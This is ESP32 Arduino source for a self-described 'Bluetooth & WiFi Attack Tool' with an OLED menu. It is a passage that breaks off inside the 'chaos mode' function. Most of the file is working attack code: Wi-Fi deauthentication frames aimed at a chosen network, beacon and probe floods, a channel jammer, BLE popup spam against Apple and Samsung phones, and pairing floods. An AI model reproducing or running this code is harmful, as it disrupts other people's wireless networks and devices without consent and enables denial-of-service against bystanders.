/*
 * ESP32 Bluetooth & WiFi Attack Tool v2.1 - OLED EDITION
 * Board: ESP32 DevKit V1 (ESP-WROOM-32)
 * Display: SSD1306 0.96" OLED (128x64) I2C
 * 
 * Features:
 * - 16 attack modes (BT + WiFi)
 * - OLED display for status & menus
 * - Serial control via laptop
 * - Real-time attack stats
 * 
 * Wiring OLED:
 *   VCC → 3.3V
 *   GND → GND
 *   SCL → GPIO 22
 *   SDA → GPIO 21
 */

#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLE2902.h>
#include <esp_bt.h>
#include <esp_bt_main.h>
#include <esp_gap_bt_api.h>
#include <esp_wifi.h>
#include <WiFi.h>

// OLED Libraries
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

// ==================== OLED CONFIG ====================
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define SCREEN_ADDRESS 0x3C

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// ==================== CONFIG ====================
#define LED_PIN 2
#define SERIAL_BAUD 115200

// ==================== GLOBALS ====================
String targetMAC = "";
String targetName = "";
String targetSSID = "";
bool attacking = false;
unsigned long attackStart = 0;
unsigned long packetCount = 0;
String currentAttack = "IDLE";
String lastStatus = "Ready";

// ==================== OLED FUNCTIONS ====================
void oledHeader(String title) {
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setTextSize(1);
    display.setCursor(0, 0);
    display.println(F("=== ESP32 ATTACK v2.1 ==="));
    display.drawLine(0, 10, 127, 10, SSD1306_WHITE);
    display.setCursor(0, 12);
    display.print(F("> "));
    display.println(title);
}

void oledStatus() {
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    
    // Header
    display.setTextSize(1);
    display.setCursor(0, 0);
    display.println(F("ESP32 ATTACK TOOL v2.1"));
    display.drawLine(0, 10, 127, 10, SSD1306_WHITE);
    
    // Status
    display.setCursor(0, 12);
    display.print(F("Mode: "));
    display.println(currentAttack);
    
    display.setCursor(0, 22);
    display.print(F("Target: "));
    if (targetMAC.length() > 0) {
        display.println(targetMAC.substring(0, 17));
    } else {
        display.println(F("NONE"));
    }
    
    display.setCursor(0, 32);
    display.print(F("Pkts: "));
    display.println(packetCount);
    
    display.setCursor(0, 42);
    display.print(F("Status: "));
    display.println(lastStatus);
    
    // Attacking indicator
    if (attacking) {
        display.setCursor(0, 54);
        display.setTextSize(1);
        display.println(F(">>> ATTACKING <<<"));
    }
    
    display.display();
}

void oledMenu() {
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setTextSize(1);
    
    display.setCursor(0, 0);
    display.println(F("ESP32 ATTACK v2.1"));
    display.drawLine(0, 10, 127, 10, SSD1306_WHITE);
    
    display.setCursor(0, 12);
    display.println(F("BT: 1-9  WiFi: A-E"));
    display.setCursor(0, 22);
    display.println(F("Combo: F-G"));
    display.setCursor(0, 32);
    display.println(F("Set: S(MAC) T(SSID)"));
    display.setCursor(0, 42);
    display.println(F("Stop: X  Menu: M"));
    display.setCursor(0, 54);
    display.println(F("Type command:"));
    
    display.display();
}

void oledAttack(String attackName, String target) {
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    
    display.setTextSize(1);
    display.setCursor(0, 0);
    display.println(F("!!! ATTACK ACTIVE !!!"));
    display.drawLine(0, 10, 127, 10, SSD1306_WHITE);
    
    display.setCursor(0, 12);
    display.print(F("Type: "));
    display.println(attackName);
    
    display.setCursor(0, 24);
    display.print(F("Target: "));
    display.println(target);
    
    display.setCursor(0, 36);
    display.print(F("Packets: "));
    display.println(packetCount);
    
    display.setCursor(0, 48);
    display.print(F("Time: "));
    display.print((millis() - attackStart) / 1000);
    display.println(F("s"));
    
    display.setCursor(0, 58);
    display.println(F("Press X to STOP"));
    
    display.display();
}

void oledScanResult(String results) {
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setTextSize(1);
    
    display.setCursor(0, 0);
    display.println(F("=== SCAN RESULTS ==="));
    display.drawLine(0, 10, 127, 10, SSD1306_WHITE);
    
    display.setCursor(0, 12);
    display.println(results);
    
    display.display();
}

// ==================== MENU ====================
void showMenu() {
    oledMenu();
    
    Serial.println(F("\n╔══════════════════════════════════════════╗"));
    Serial.println(F("║   ESP32 BT/WiFi ATTACK TOOL v2.1 OLED   ║"));
    Serial.println(F("╠══════════════════════════════════════════╣"));
    Serial.println(F("║  ═══ BLUETOOTH ATTACKS ═══              ║"));
    Serial.println(F("║  [1] BLE Scanner                         ║"));
    Serial.println(F("║  [2] BT Classic Scanner                  ║"));
    Serial.println(F("║  [3] BLE Deauth Attack                   ║"));
    Serial.println(F("║  [4] BT A2DP Jam (Audio devices)         ║"));
    Serial.println(F("║  [5] BT Pairing Flood                    ║"));
    Serial.println(F("║  [6] BLE Spam (Apple popups)             ║"));
    Serial.println(F("║  [7] BLE Spam (Samsung popups)           ║"));
    Serial.println(F("║  [8] BLE Spam (All devices)              ║"));
    Serial.println(F("║  [9] BT Channel Hopper                   ║"));
    Serial.println(F("║  ═══ WIFI ATTACKS ═══                   ║"));
    Serial.println(F("║  [A] WiFi Scanner                        ║"));
    Serial.println(F("║  [B] WiFi Deauth Attack                  ║"));
    Serial.println(F("║  [C] WiFi Beacon Flood                   ║"));
    Serial.println(F("║  [D] WiFi Probe Flood                    ║"));
    Serial.println(F("║  [E] WiFi Channel Jammer                 ║"));
    Serial.println(F("║  ═══ COMBINED ═══                        ║"));
    Serial.println(F("║  [F] Dual Attack (BT+WiFi)               ║"));
    Serial.println(F("║  [G] CHAOS MODE (ALL ATTACKS)            ║"));
    Serial.println(F("║  ═══ SETTINGS ═══                        ║"));
    Serial.println(F("║  [S] Set Target MAC                      ║"));
    Serial.println(F("║  [T] Set Target SSID                     ║"));
    Serial.println(F("║  [X] Stop All Attacks                    ║"));
    Serial.println(F("║  [M] Show Menu                           ║"));
    Serial.println(F("║  [I] System Info                         ║"));
    Serial.println(F("╚══════════════════════════════════════════╝"));
    
    Serial.print(F("\n> Target MAC: "));
    Serial.println(targetMAC.length() > 0 ? targetMAC : "NONE");
    Serial.print(F("> Target SSID: "));
    Serial.println(targetSSID.length() > 0 ? targetSSID : "NONE");
    Serial.print(F("> Uptime: "));
    Serial.print(millis() / 1000);
    Serial.println(F("s\n"));
}

// ==================== SYSTEM INFO ====================
void showSystemInfo() {
    oledHeader("System Info");
    
    Serial.println(F("\n=== SYSTEM INFO ==="));
    Serial.print(F("Chip: "));
    Serial.println(ESP.getChipModel());
    Serial.print(F("Revision: "));
    Serial.println(ESP.getChipRevision());
    Serial.print(F("Cores: "));
    Serial.println(ESP.getChipCores());
    Serial.print(F("CPU Freq: "));
    Serial.print(ESP.getCpuFreqMHz());
    Serial.println(F(" MHz"));
    Serial.print(F("Flash: "));
    Serial.print(ESP.getFlashChipSize() / 1024 / 1024);
    Serial.println(F(" MB"));
    Serial.print(F("Free Heap: "));
    Serial.print(ESP.getFreeHeap());
    Serial.println(F(" bytes"));
    Serial.print(F("BT: "));
    Serial.println(F("Classic + BLE"));
    Serial.print(F("WiFi: "));
    Serial.println(F("802.11 b/g/n"));
    Serial.print(F("OLED: "));
    Serial.println(F("SSD1306 128x64"));
    
    display.setCursor(0, 30);
    display.print(F("Chip: "));
    display.println(ESP.getChipModel());
    display.print(F("Heap: "));
    display.println(ESP.getFreeHeap());
    display.display();
}

// ==================== 1. BLE SCANNER ====================
void cmd_BLEScan() {
    currentAttack = "BLE Scan";
    lastStatus = "Scanning...";
    oledAttack("BLE SCAN", "All Devices");
    
    Serial.println(F("\n[*] BLE SCAN - 10 seconds..."));
    Serial.println(F("────────────────────────────────────────"));
    
    BLEDevice::init("");
    BLEScan* scan = BLEDevice::getScan();
    scan->setAdvertisedDeviceCallbacks(new BLEAdvertisedDeviceCallbacks() {
        void onResult(BLEAdvertisedDevice dev) {
            Serial.print("[BLE] ");
            Serial.print(dev.getAddress().toString().c_str());
            Serial.print(" | RSSI:");
            Serial.print(dev.getRSSI());
            Serial.print("dBm | ");
            Serial.print(dev.haveName() ? dev.getName().c_str() : "(unknown)");
            if (dev.haveServiceUUID()) {
                Serial.print(" | UUID:");
                Serial.print(dev.getServiceUUID().toString().c_str());
            }
            Serial.println();
        }
    });
    scan->setActiveScan(true);
    scan->setInterval(100);
    scan->setWindow(99);
    
    BLEScanResults results = scan->start(10, false);
    
    Serial.println(F("────────────────────────────────────────"));
    Serial.printf("[*] Found %d BLE devices\n\n", results.getCount());
    
    lastStatus = String(results.getCount()) + " BLE devices found";
    oledStatus();
    
    scan->clearResults();
    BLEDevice::deinit(true);
    currentAttack = "IDLE";
}

// ==================== 2. BT CLASSIC SCANNER ====================
void cmd_BTClassicScan() {
    currentAttack = "BT Classic";
    lastStatus = "Scanning Classic BT...";
    oledAttack("BT CLASSIC", "All Devices");
    
    Serial.println(F("\n[*] BT CLASSIC SCAN - 10 seconds..."));
    Serial.println(F("────────────────────────────────────────"));
    
    if (!btStart()) {
        Serial.println(F("[!] BT init failed"));
        lastStatus = "BT init failed!";
        oledStatus();
        return;
    }
    
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    esp_bt_controller_init(&bt_cfg);
    esp_bt_controller_enable(ESP_BT_MODE_CLASSIC_BT);
    esp_bt_dev_set_device_name("ESP32-Scanner");
    esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL, 10, 0);
    
    Serial.println(F("[*] Scanning for Classic BT devices..."));
    delay(11000);
    
    esp_bt_gap_cancel_discovery();
    esp_bt_controller_disable();
    
    Serial.println(F("────────────────────────────────────────"));
    Serial.println(F("[*] Classic BT scan complete\n"));
    
    lastStatus = "Classic BT scan done";
    oledStatus();
    currentAttack = "IDLE";
}

// ==================== 3. BLE DEAUTH=======...void cmd_BLEDeauth() {
    if (targetMAC.length() == 0) {
        Serial.println(F("[!] Set target MAC first! (press S)"));
        lastStatus = "No target! Press S";
        oledStatus();
        return;
    }
    
    currentAttack = "BLE Deauth";
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    Serial.println(F("\n[*] BLE DEAUTH ATTACK"));
    Serial.printf("[*] Target: %s (%s)\n", targetMAC.c_str(), targetName.c_str());
    Serial.println(F("[*] Press X to stop\n"));
    
    BLEDevice::init("DeauthTool");
    
    for (int i = 0; i < 3; i++) {
        BLEServer* srv = BLEDevice::createServer();
        BLEService* svc = srv->createService(BLEUUID("1800"));
        svc->start();
    }
    
    while (attacking) {
        BLEAdvertising* adv = BLEDevice::getAdvertising();
        adv->setMinInterval(0x20);
        adv->setMaxInterval(0x40);
        BLEDevice::startAdvertising();
        delay(50);
        BLEDevice::stopAdvertising();
        delay(20);
        
        BLEAdvertisementData scanResp;
        scanResp.setName("Device");
        adv->setScanResponseData(scanResp);
        BLEDevice::startAdvertising();
        delay(30);
        BLEDevice::stopAdvertising();
        
        packetCount++;
        
        if (millis() - attackStart > 1000) {
            oledAttack("BLE DEAUTH", targetMAC);
            Serial.printf("[*] Deauth: %lu packets\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    BLEDevice::deinit(true);
    lastStatus = "Deauth stopped";
    oledStatus();
    currentAttack = "IDLE";
}

// ==================== 4. BT A2DP JAM ====================
void cmd_A2DPJam() {
    currentAttack = "A2DP Jam";
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    Serial.println(F("\n[*] BT A2DP JAM - Targeting audio devices"));
    Serial.println(F("[*] Press X to stop\n"));
    
    BLEDevice::init("A2DP-Jam");
    
    const char* speakerNames[] = {"JBL", "Sony", "Bose", "Samsung", "Xiaomi"};
    
    while (attacking) {
        BLEAdvertising* adv = BLEDevice::getAdvertising();
        BLEAdvertisementData advData;
        advData.setFlags(0x06);
        advData.setName("JBL Flip");
        advData.setManufacturerData("\x4C\x00");
        adv->setAdvertisementData(advData);
        adv->addServiceUUID(BLEUUID("110B"));
        BLEDevice::startAdvertising();
        delay(100);
        BLEDevice::stopAdvertising();
        delay(50);
        
        for (int i = 0; i < 5; i++) {
            BLEAdvertisementData fakeAdv;
            fakeAdv.setFlags(0x06);
            fakeAdv.setName(speakerNames[i]);
            adv->setAdvertisementData(fakeAdv);
            BLEDevice::startAdvertising();
            delay(80);
            BLEDevice::stopAdvertising();
            delay(30);
        }
        
        packetCount++;
        
        if (millis() - attackStart > 1000) {
            oledAttack("A2DP JAM", "Audio Devices");
            Serial.printf("[*] A2DP Jam: %lu packets\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    BLEDevice::deinit(true);
    lastStatus = "A2DP Jam stopped";
    oledStatus();
    currentAttack = "IDLE";
}

// ==================== 5. BT PAIRING FLOOD ====================
void cmd_PairingFlood() {
    currentAttack = "Pair Flood";
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    Serial.println(F("\n[*] BT PAIRING FLOOD"));
    Serial.println(F("[*] Press X to stop\n"));
    
    BLEDevice::init("PairFlood");
    
    while (attacking) {
        for (int i = 0; i < 5; i++) {
            BLEServer* srv = BLEDevice::createServer();
            BLEService* svc = srv->createService(BLEUUID("1800"));
            svc->start();
            
            BLEAdvertising* adv = BLEDevice::getAdvertising();
            BLEAdvertisementData data;
            data.setFlags(0x05);
            data.setName("Phone_" + String(i));
            adv->setAdvertisementData(data);
            adv->setMinInterval(0x20);
            adv->setMaxInterval(0x40);
            
            BLEDevice::startAdvertising();
            delay(100);
            BLEDevice::stopAdvertising();
            
            srv->removeService(svc);
            delete svc;
            delete srv;
        }
        
        packetCount += 5;
        
        if (millis() - attackStart > 1000) {
            oledAttack("PAIR FLOOD", "All Devices");
            Serial.printf("[*] Pairing flood: %lu requests\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    BLEDevice::deinit(true);
    lastStatus = "Pairing flood stopped";
    oledStatus();
    currentAttack = "IDLE";
}

// ==================== 6. BLE SPAM (APPLE) ====================
void cmd_BLESpamApple() {
    currentAttack = "Apple Spam";
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    Serial.println(F("\n[*] BLE SPAM - Apple Device Popups"));
    Serial.println(F("[*] Press X to stop\n"));
    
    BLEDevice::init("AppleSpam");
    BLEAdvertising* adv = BLEDevice::getAdvertising();
    
    uint8_t appleData1[] = {0x01, 0x07, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
    uint8_t appleData2[] = {0x01, 0x0A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
    uint8_t appleData3[] = {0x01, 0x0E, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
    uint8_t appleData4[] = {0x01, 0x16, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
    
    while (attacking) {
        uint8_t* payloads[] = {appleData1, appleData2, appleData3, appleData4};
        
        for (int i = 0; i < 4; i++) {
            BLEAdvertisementData advData;
            advData.setFlags(0x01);
            advData.setManufacturerData(String((char*)payloads[i], 8));
            adv->setAdvertisementData(advData);
            
            BLEDevice::startAdvertising();
            delay(100);
            BLEDevice::stopAdvertising();
            delay(50);
            
            packetCount++;
        }
        
        if (millis() - attackStart > 1000) {
            oledAttack("APPLE SPAM", "iPhones/iPads");
            Serial.printf("[*] Apple spam: %lu popups\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    BLEDevice::deinit(true);
    lastStatus = "Apple spam stopped";
    oledStatus();
    currentAttack = "IDLE";
}

// ==================== 7. BLE SPAM (SAMSUNG) ====================
void cmd_BLESpamSamsung() {
    currentAttack = "Samsung Spam";
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    Serial.println(F("\n[*] BLE SPAM - Samsung Device Popups"));
    Serial.println(F("[*] Press X to stop\n"));
    
    BLEDevice::init("SamsungSpam");
    BLEAdvertising* adv = BLEDevice::getAdvertising();
    
    while (attacking) {
        uint8_t samsungData[] = {0x42, 0x09, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08};
        
        BLEAdvertisementData advData;
        advData.setFlags(0x06);
        advData.setManufacturerData(String((char*)samsungData, 10));
        adv->setAdvertisementData(advData);
        
        BLEDevice::startAdvertising();
        delay(150);
        BLEDevice::stopAdvertising();
        delay(100);
        
        packetCount++;
        
        if (millis() - attackStart > 1000) {
            oledAttack("SAMSUNG SPAM", "Galaxy Devices");
            Serial.printf("[*] Samsung spam: %lu popups\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    BLEDevice::deinit(true);
    lastStatus = "Samsung spam stopped";
    oledStatus();
    currentAttack = "IDLE";
}

// ==================== 8. BLE SPAM (ALL) ====================
void cmd_BLESpamAll() {
    currentAttack = "All Spam";
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    Serial.println(F("\n[*] BLE SPAM - ALL DEVICES"));
    Serial.println(F("[*] Press X to stop\n"));
    
    BLEDevice::init("SpamAll");
    BLEAdvertising* adv = BLEDevice::getAdvertising();
    
    while (attacking) {
        uint8_t appleData[] = {0x01, 0x07, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
        BLEAdvertisementData advData1;
        advData1.setManufacturerData(String((char*)appleData, 8));
        adv->setAdvertisementData(advData1);
        BLEDevice::startAdvertising();
        delay(100);
        BLEDevice::stopAdvertising();
        delay(50);
        
        uint8_t samsungData[] = {0x42, 0x09, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
        BLEAdvertisementData advData2;
        advData2.setManufacturerData(String((char*)samsungData, 8));
        adv->setAdvertisementData(advData2);
        BLEDevice::startAdvertising();
        delay(100);
        BLEDevice::stopAdvertising();
        delay(50);
        
        BLEAdvertisementData advData3;
        advData3.setFlags(0x06);
        advData3.setName("Free_WiFi");
        adv->setAdvertisementData(advData3);
        BLEDevice::startAdvertising();
        delay(100);
        BLEDevice::stopAdvertising();
        
        packetCount += 3;
        
        if (millis() - attackStart > 1000) {
            oledAttack("ALL SPAM", "All Devices");
            Serial.printf("[*] All spam: %lu packets\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    BLEDevice::deinit(true);
    lastStatus = "All spam stopped";
    oledStatus();
    currentAttack = "IDLE";
}

// ==================== 9. BT CHANNEL HOPPER ====================
void cmd_BTChannelHopper() {
    currentAttack = "CH Hopper";
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    Serial.println(F("\n[*] BT CHANNEL HOPPER"));
    Serial.println(F("[*] Press X to stop\n"));
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    BLEDevice::init("ChannelHop");
    
    while (attacking) {
        for (int ch = 1; ch <= 13; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            
            BLEAdvertising* adv = BLEDevice::getAdvertising();
            adv->setMinInterval(0x20);
            adv->setMaxInterval(0x20);
            
            BLEDevice::startAdvertising();
            delayMicroseconds(500);
            BLEDevice::stopAdvertising();
            
            packetCount++;
        }
        
        if (millis() - attackStart > 1000) {
            oledAttack("CH HOPPER", "All BT/WiFi");
            Serial.printf("[*] Channel hop: %lu cycles\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    WiFi.mode(WIFI_OFF);
    BLEDevice::deinit(true);
    lastStatus = "Channel hop stopped";
    oledStatus();
    currentAttack = "IDLE";
}

// ==================== A. WiFi SCANNER ====================
void cmd_WiFiScan() {
    currentAttack = "WiFi Scan";
    lastStatus = "Scanning WiFi...";
    oledAttack("WiFi SCAN", "All Networks");
    
    Serial.println(F("\n[*] WiFi SCAN - 5 seconds..."));
    Serial.println(F("────────────────────────────────────────"));
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    int n = WiFi.scanNetworks();
    
    for (int i = 0; i < n; i++) {
        Serial.printf("[WiFi] %s | CH:%d | RSSI:%d dBm | %s | %s\n",
            WiFi.SSID(i).c_str(),
            WiFi.channel(i),
            WiFi.RSSI(i),
            WiFi.BSSIDstr(i).c_str(),
            WiFi.encryptionType(i) == WIFI_AUTH_OPEN ? "OPEN" : "ENCRYPTED"
        );
    }
    
    Serial.println(F("────────────────────────────────────────"));
    Serial.printf("[*] Found %d WiFi networks\n\n", n);
    
    lastStatus = String(n) + " WiFi networks";
    oledStatus();
    
    WiFi.scanDelete();
    currentAttack = "IDLE";
}

// ==================== B. WiFi DEAUTH=======...void cmd_WiFiDeauth() {
    if (targetSSID.length() == 0 && targetMAC.length() == 0) {
        Serial.println(F("[!] Set target SSID (T) or MAC (S) first!"));
        lastStatus = "No target! Press T/S";
        oledStatus();
        return;
    }
    
    currentAttack = "WiFi Deauth";
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    Serial.println(F("\n[*] WiFi DEAUTH ATTACK"));
    Serial.printf("[*] Target: %s\n", targetSSID.length() > 0 ? targetSSID.c_str() : targetMAC.c_str());
    Serial.println(F("[*] Press X to stop\n"));
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    
    int targetChannel = 1;
    if (targetSSID.length() > 0) {
        int n = WiFi.scanNetworks();
        for (int i = 0; i < n; i++) {
            if (WiFi.SSID(i) == targetSSID) {
                targetChannel = WiFi.channel(i);
                targetMAC = WiFi.BSSIDstr(i);
                break;
            }
        }
        WiFi.scanDelete();
    }
    
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    
    uint8_t deauthPacket[] = {
        0xC0, 0x00, 0x3A, 0x01,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x07, 0x00
    };
    
    if (targetMAC.length() == 17) {
        uint8_t mac[6];
        sscanf(targetMAC.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
        memcpy(&deauthPacket[10], mac, 6);
        memcpy(&deauthPacket[16], mac, 6);
    }
    
    while (attacking) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
        delay(10);
        
        deauthPacket[0] = 0xA0;
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
        delay(10);
        deauthPacket[0] = 0xC0;
        
        packetCount += 2;
        
        if (millis() - attackStart > 1000) {
            oledAttack("WiFi DEAUTH", targetSSID.length() > 0 ? targetSSID : targetMAC);
            Serial.printf("[*] WiFi deauth: %lu frames\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    WiFi.mode(WIFI_OFF);
    lastStatus = "WiFi deauth stopped";
    oledStatus();
    currentAttack = "IDLE";
}

// ==================== C. WiFi BEACON FLOOD ====================
void cmd_WiFiBeaconFlood() {
    currentAttack = "Beacon Flood";
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    Serial.println(F("\n[*] WiFi BEACON FLOOD"));
    Serial.println(F("[*] Press X to stop\n"));
    
    WiFi.mode(WIFI_STA);
    
    const char* fakeSSIDs[] = {
        "FREE_WIFI", "FREE_INTERNET", "CONNECT_HERE",
        "STARBUCKS", "MCDONALDS", "AIRPORT_WIFI",
        "HOTEL_GUEST", "COVID_TRACKER", "FBI_VAN",
        "VIRUS_DOWNLOAD", "HACKED_NET", "NO_INTERNET"
    };
    
    while (attacking) {
        for (int i = 0; i < 12; i++) {
            uint8_t beaconPacket[128] = {
                0x80, 0x00, 0x00, 0x00,
                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
                0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
                0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x64, 0x00, 0x01, 0x04,
            };
            
            int ssidLen = strlen(fakeSSIDs[i]);
            beaconPacket[37] = 0x00;
            beaconPacket[38] = ssidLen;
            memcpy(&beaconPacket[39], fakeSSIDs[i], ssidLen);
            
            beaconPacket[10] = random(0, 255);
            beaconPacket[11] = random(0, 255);
            beaconPacket[12] = random(0, 255);
            
            esp_wifi_set_channel(random(1, 14), WIFI_SECOND_CHAN_NONE);
            esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, 39 + ssidLen, false);
            
            packetCount++;
        }
        
        delay(100);
        
        if (millis() - attackStart > 1000) {
            oledAttack("BEACON FLOOD", "12 Fake APs");
            Serial.printf("[*] Beacon flood: %lu packets\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    WiFi.mode(WIFI_OFF);
    lastStatus = "Beacon flood stopped";
    oledStatus();
    currentAttack = "IDLE";
}

// ==================== D. WiFi PROBE FLOOD ====================
void cmd_WiFiProbeFlood() {
    currentAttack = "Probe Flood";
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    Serial.println(F("\n[*] WiFi PROBE REQUEST FLOOD"));
    Serial.println(F("[*] Press X to stop\n"));
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    
    const char* probeSSIDs[] = {"HOME", "OFFICE", "WIFI", "INTERNET", "NETWORK",
                                 "5G", "FREE", "PUBLIC", "GUEST", "DEFAULT"};
    
    while (attacking) {
        for (int i = 0; i < 10; i++) {
            uint8_t probePacket[64] = {
                0x40, 0x00, 0x00, 0x00,
                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                0x00, 0x00,
            };
            
            int ssidLen = strlen(probeSSIDs[i]);
            probePacket[25] = 0x00;
            probePacket[26] = ssidLen;
            memcpy(&probePacket[27], probeSSIDs[i], ssidLen);
            
            probePacket[10] = random(0, 255);
            probePacket[11] = random(0, 255);
            probePacket[12] = random(0, 255);
            
            esp_wifi_set_channel(random(1, 14), WIFI_SECOND_CHAN_NONE);
            esp_wifi_80211_tx(WIFI_IF_STA, probePacket, 27 + ssidLen, false);
            
            packetCount++;
        }
        
        delay(50);
        
        if (millis() - attackStart > 1000) {
            oledAttack("PROBE FLOOD", "All Channels");
            Serial.printf("[*] Probe flood: %lu packets\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    WiFi.mode(WIFI_OFF);
    lastStatus = "Probe flood stopped";
    oledStatus();
    currentAttack = "IDLE";
}

// ==================== E. WiFi CHANNEL JAMMER ====================
void cmd_WiFiJammer() {
    currentAttack = "WiFi Jammer";
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    Serial.println(F("\n[*] WiFi CHANNEL JAMMER"));
    Serial.println(F("[*] Press X to stop\n"));
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    
    uint8_t noisePacket[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
        0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
        0x00, 0x00,
        0x4A, 0x41, 0x4D, 0x4D, 0x45, 0x52
    };
    
    while (attacking) {
        for (int ch = 1; ch <= 13; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            
            for (int j = 0; j < 10; j++) {
                noisePacket[10] = random(0, 255);
                noisePacket[11] = random(0, 255);
                esp_wifi_80211_tx(WIFI_IF_STA, noisePacket, sizeof(noisePacket), false);
                packetCount++;
            }
        }
        
        if (millis() - attackStart > 1000) {
            oledAttack("WiFi JAMMER", "CH 1-13");
            Serial.printf("[*] WiFi jam: %lu noise packets\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    WiFi.mode(WIFI_OFF);
    lastStatus = "WiFi jammer stopped";
    oledStatus();
    currentAttack = "IDLE";
}

// ==================== F. DUAL ATTACK ====================
void cmd_DualAttack() {
    currentAttack = "Dual Attack";
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    Serial.println(F("\n[*] DUAL ATTACK - BT + WiFi"));
    Serial.println(F("[*] Press X to stop\n"));
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    BLEDevice::init("DualAttack");
    
    while (attacking) {
        for (int ch = 1; ch <= 13; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            
            uint8_t noise[] = {0xFF, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x00};
            esp_wifi_80211_tx(WIFI_IF_STA, noise, sizeof(noise), false);
            
            BLEAdvertising* adv = BLEDevice::getAdvertising();
            adv->setMinInterval(0x20);
            BLEDevice::startAdvertising();
            delayMicroseconds(100);
            BLEDevice::stopAdvertising();
            
            packetCount++;
        }
        
        if (millis() - attackStart > 1000) {
            oledAttack("DUAL ATTACK", "BT + WiFi");
            Serial.printf("[*] Dual attack: %lu packets\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    WiFi.mode(WIFI_OFF);
    BLEDevice::deinit(true);
    lastStatus = "Dual attack stopped";
    oledStatus();
    currentAttack = "IDLE";
}

// ==================== G. CHAOS MODE ====================
void cmd_ChaosMode() {
    currentAttack = "CHAOS MODE";
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    Serial.println(F("\n*** CHAOS MODE ACTIVATED ***"));
    Serial.println(F("[*] Press X to stop\n"));
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    BLEDevice::init("CHAOS");
    
    while (attacking) {
        for (int ch = 1; ch <= 13; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            
